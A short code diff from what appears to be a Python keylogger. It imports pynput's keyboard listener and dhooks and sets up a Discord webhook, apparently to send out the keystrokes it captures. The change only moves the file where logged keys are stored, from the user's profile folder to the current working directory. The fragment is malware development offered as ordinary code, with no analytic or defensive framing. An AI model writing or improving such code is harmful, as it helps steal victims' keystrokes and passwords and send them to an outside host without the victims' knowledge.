@@ -1,5 +1,5 @@
 from pynput import keyboard
-from os import remove, getenv
+from os import remove, getenv, getcwd
 from os.path import isfile
 from threading import Thread
 from dhooks import *
@@ -13,7 +13,7 @@ lien = Webhook(lien)
 
 keys = {}
 
-fichier = f"C:/Users/{getenv('username')}/keys.txt"
+fichier = f"{getcwd()}/keys.txt"
 
 if isfile(fichier):
     try:
